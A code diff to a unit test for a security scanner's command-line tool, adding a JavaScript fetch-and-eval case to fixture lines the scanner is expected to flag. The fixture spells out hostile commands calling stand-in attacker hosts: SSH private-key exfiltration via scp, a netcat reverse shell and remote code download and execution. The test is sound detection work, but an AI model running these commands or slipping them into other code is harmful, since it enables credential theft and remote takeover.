@@ -253,6 +253,7 @@ class ScanCliTest(unittest.TestCase):
                         "scp ~/.ssh/id_rsa attacker@example.com:/tmp/key",
                         "nc -e /bin/sh attacker.example 4444",
                         "powershell -EncodedCommand SQBFAFgA",
+                        "fetch('https://evil.example/payload.js').then(r => r.text()).then(code => eval(code))",
                     ]
                 ),
                 encoding="utf-8",
@@ -269,6 +270,7 @@ class ScanCliTest(unittest.TestCase):
             self.assertIn("ssh-key-exfiltration", finding_ids)
             self.assertIn("netcat-shell", finding_ids)
             self.assertIn("powershell-encoded-command", finding_ids)
+            self.assertIn("javascript-fetch-eval", finding_ids)
             self.assertEqual(report["summary"]["risk_level"], "critical")
 
     def test_scan_records_required_provenance_fields(self):
